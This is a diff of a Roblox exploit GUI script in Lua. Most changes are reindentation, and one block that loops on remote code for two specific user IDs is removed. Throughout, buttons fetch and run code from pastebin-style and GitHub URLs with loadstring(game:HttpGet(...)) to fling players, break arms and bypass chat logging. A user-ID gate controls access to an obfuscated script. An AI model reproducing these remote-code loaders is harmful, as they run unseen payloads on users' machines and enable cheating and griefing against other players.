@@ -3900,7 +3906,7 @@ loadstring(game:HttpGet("https://textbin.net/raw/hmtw3zllmp",true))()
 end)
 
 FeSection:NewButton("FE break arms", "break arms duh", function()-- break arms FE
-  loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./main/Wow'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./main/Wow'))()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./main/Wow%202'))()
 end)
@@ -4124,8 +4130,8 @@ game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 end)
 
 HomeSection:NewButton("tagapagpatupad", "xherushutup", function()
-  --99
-  loadstring(game:HttpGet("https://pastecode.dev/raw/E7GMNU4Q/99fail-fling_lulaslollipop",true))()
+--99
+loadstring(game:HttpGet("https://pastecode.dev/raw/E7GMNU4Q/99fail-fling_lulaslollipop",true))()
 end)
 
 HomeSection:NewButton("Ping Kounter", "see ping", function()
@@ -4216,22 +4222,22 @@ end)
 
 HomeSection:NewButton("Destroy toggle", "bye", function()--gui destroyer
 for i,v in pairs(game.CoreGui:GetDescendants()) do
- if v.Name == "ScreenGui" then
-  v:Destroy()
- end
+if v.Name == "ScreenGui" then
+v:Destroy()
+end
 end
 end)
 
 HomeSection:NewButton("obf", "no info", function()
 local userid = game.Players.LocalPlayer.UserId
 local lula = 3001347724
-  if userid == lula then
+if userid == lula then
 --obFEskator
 loadstring(game:HttpGet("https://pastecode.dev/raw/d8ufe891/obFEskator_lulaslollipop.zip",true))();
-  else
+else
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/kustomnotif/main/notifikation_lulaslollipop",true))()
-  Notify("🔒", "No Access", 5)
-  end
+Notify("🔒", "No Access", 5)
+end
 end)
 HomeSection:NewButton("ANTI()", "anti xhat logger & xhatbypass", function()
 -- anti xhatlog/xhatbypass
@@ -4247,13 +4253,13 @@ local More = Window:NewTab("More")
 local MoreSection = More:NewSection("more skripts koming soon...🍭")
 
 Players.ChildAdded:connect(function()
-    local count = #game.Players:GetPlayers()
-    serversize:UpdateLabel("Server Size: ".. count .."/" .. maxplrs)
+local count = #game.Players:GetPlayers()
+serversize:UpdateLabel("Server Size: ".. count .."/" .. maxplrs)
 end)
 
 Players.ChildRemoved:connect(function(child)
-    local count = #game.Players:GetPlayers()
-    serversize:UpdateLabel("Server Size: ".. count .."/" .. maxplrs)
+local count = #game.Players:GetPlayers()
+serversize:UpdateLabel("Server Size: ".. count .."/" .. maxplrs)
 end)
 
 MoreSection:NewButton("Player Notifier", "will notify if a player leaves/joined",
@@ -4331,24 +4337,24 @@ local Crouching = false
 UserInputService.InputBegan:Connect(function(input,gameprocessed)
 if gameprocessed then return end
 if input.KeyCode == Enum.KeyCode[KEY] then
-   Crouching = true
-   Crouch:Play(.1)
-   Humanoid.WalkSpeed = CROUCHWALKSPEED
+Crouching = true
+Crouch:Play(.1)
+Humanoid.WalkSpeed = CROUCHWALKSPEED
 end
 end)
 
 UserInputService.InputEnded:Connect(function(input,gameprocessed)
 if gameprocessed then return end
 if input.KeyCode == Enum.KeyCode[KEY] then
-   Crouching = false
-   Crouch:Stop(.1)
-   Humanoid.WalkSpeed = oldWS
+Crouching = false
+Crouch:Stop(.1)
+Humanoid.WalkSpeed = oldWS
 end
 end)
 
 Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
 if Crouching then
-   Humanoid.WalkSpeed = CROUCHWALKSPEED
+Humanoid.WalkSpeed = CROUCHWALKSPEED
 end
 end)
 end)
@@ -4521,20 +4527,11 @@ end)
 local MoreSection = More:NewSection("no")
 
 MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.Insert, function()
-  Library:ToggleUI()
+Library:ToggleUI()
 end)
 --sumthing
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))();
 
-if game.Players.LocalPlayer.UserId == 4406450103 then
-while true do loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/70e922f6b88eee9ca92a74a1dd51bdfa4dbde187/CoinsWalmart",true))();
-end
-end;
-if game.Players.LocalPlayer.UserId == 3001347724 then
-while true do
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/70e922f6b88eee9ca92a74a1dd51bdfa4dbde187/CoinsWalmart",true))();
-end
-end;
 
 
 -- [ TOGGLE klose/open ] --
